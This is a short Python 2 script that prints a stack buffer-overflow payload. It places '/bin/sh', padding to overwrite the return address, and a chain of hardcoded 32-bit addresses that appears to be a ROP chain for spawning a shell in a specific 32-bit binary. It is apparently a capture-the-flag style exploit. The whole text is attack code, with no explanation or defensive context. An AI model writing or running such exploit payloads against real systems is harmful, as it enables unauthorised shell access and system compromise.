from struct import pack 
bin_sh = "/bin/sh"
print bin_sh + "\x01" * (0x64 - len(bin_sh) + 4) + pack("<I", 0xbffe71bc) + "\x01" * 4 + pack("<I", 0x080560db)+ pack("<I", 0x08055dd8) + pack("<I", 0x0806a69c) + pack("<I", 0x080c4ae5) + pack("<I", 0x08055fa5) + pack("<I", 0x0805ebf7) + pack("<I", 0x08055eee) + pack("<I", 0x0807b2d9) * 11 + pack("<I", 0x0804949a)
